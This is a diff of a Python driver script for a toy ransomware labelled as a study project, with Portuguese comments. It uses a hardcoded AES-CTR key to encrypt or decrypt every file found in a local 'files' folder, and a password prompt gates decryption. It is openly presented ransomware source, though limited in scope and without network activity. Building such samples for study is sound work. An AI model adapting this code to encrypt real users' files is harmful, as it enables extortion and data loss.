@@ -1,54 +1,69 @@
-#!/urs/bin/python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-from Crypto.Cipher import AES
-from Crypto.Util.Counter import new as Counter
+
+from Crypto.Util import Counter
+from gui import pedir_senha
 import argparse
 import os
 import Discovery
-import Crypter
+import Crypter1
 
-# A SENHA PODE TER OS SEGUINTES TAMANHOS: 128, 192 OU 256 BITS
-HARDCODED_KEY = '0123456789abcdef'  # Chave de 16 bytes (128 bits)
+# Chave fixa de 128 bits
+HARDCODED_KEY = "0123456789abcdef"
 
 def get_parser():
-    parser = argparse.ArgumentParser(description='Ransomware Simples')
-    parser.add_argument('-d', '--decrypt', help='Decripta os arquivos', action='store_true')
+    parser = argparse.ArgumentParser(description="Ransomware Simples - Estudo")
+    parser.add_argument(
+        "-d", "--decrypt",
+        help="Desencripta os arquivos",
+        action="store_true"
+    )
     return parser
 
 def main():
     parser = get_parser()
-    args = vars(parser.parse_args())
-    decrypt = args['decrypt']
+    args = parser.parse_args()
+    decrypt = args.decrypt
 
+    key = HARDCODED_KEY.encode()
+
+    # --- MODO DESCRIPTOGRAFIA ---
     if decrypt:
-        print('''Os seus arquivos foram criptografados com sucesso!' 
-        Para recuperar os seus arquivos utilize a chave: '{}'
-        '''.format(HARDCODED_KEY))
-        key = input('Digite a chave para continuar: ')  
-    else:
-        if HARDCODED_KEY:
-            key = HARDCODED_KEY
+        print("Modo de desencriptação ativado.")
+        user_key = pedir_senha()
 
+        if user_key is None:
+            print("Operação cancelada.")
+            return
+
+        user_key = user_key.encode()
+
+        if user_key != key:
+            print("Senha incorreta. Encerrando.")
+            return
+
+    # Diretório alvo
+    target_dir = os.path.join(os.getcwd(), "files")
+
+    if not os.path.exists(target_dir):
+        print("A pasta 'files' não existe.")
+        return
+
+    # Inicializa CTR e objeto Crypter
     ctr = Counter.new(128)
-    key = key.encode()
+    crypt_obj = Crypter1.Crypter(key, ctr)
 
-    crypt = Crypter.Crypter(key, ctr)
-    if not decrypt:
-        cryptoFn = crypt.encrypt
-    else:
-        cryptoFn = crypt.decrypt
+    cryptoFn = crypt_obj.decrypt if decrypt else crypt_obj.encrypt
 
-    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
-    startDirs = [init_path]
+    print(f"{'Desencriptando' if decrypt else 'Encriptando'} arquivos em: {target_dir}")
 
-    for currentDir in startDirs:
-        for filename in Discovery.discover(currentDir):
-            print('Processando arquivo:', filename)
-            Crypter.change_files(filename, cryptoFn)
-    for _ in range(100):
-        pass
-    if not decrypt:
-        print('Todos os seus arquivos foram criptografados com sucesso!')
-    pass
-if __name__ == '__main__':
+    files = Discovery.discover(target_dir)
+
+    for file in files:
+        print("Processando:", file)
+        Crypter1.change_files(file, cryptoFn)
+
+    print("Processo finalizado.")
+
+if __name__ == "__main__":
     main()
